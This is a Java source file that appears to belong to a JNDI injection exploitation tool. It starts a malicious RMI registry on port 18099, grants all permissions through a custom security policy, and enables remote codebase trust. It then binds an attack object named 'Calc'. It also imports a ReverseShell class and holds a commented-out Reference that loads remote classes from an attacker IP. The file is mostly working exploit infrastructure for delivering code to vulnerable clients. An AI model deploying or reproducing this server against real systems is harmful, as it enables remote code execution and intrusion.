package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.example.HackObj.Calc;
import org.example.HackObj.ReverseShell;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.security.*;

public class RMIServer {
    public static void start() {
        try {
            // 设置自定义安全策略
            Policy.setPolicy(new Policy() {
                @Override
                public PermissionCollection getPermissions(CodeSource codesource) {
                    Permissions permissions = new Permissions();
                    permissions.add(new AllPermission()); // 授予所有权限
                    return permissions;
                }
            });
            if (System.getSecurityManager() == null) {
                System.setSecurityManager(new SecurityManager());
            }
            // 创建并绑定 RMI 注册表
            Registry registry = LocateRegistry.createRegistry(18099);
            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
            Calc calc = new Calc();
//            Reference reference = new Reference("Calc","Calc","http://"+CmdArgs.ncIp+":8000/");
//            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("Calc",calc);

            System.out.println("\033[32;1m" + "[+]RMIServer\t started on port 18099" + "\033[0m");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
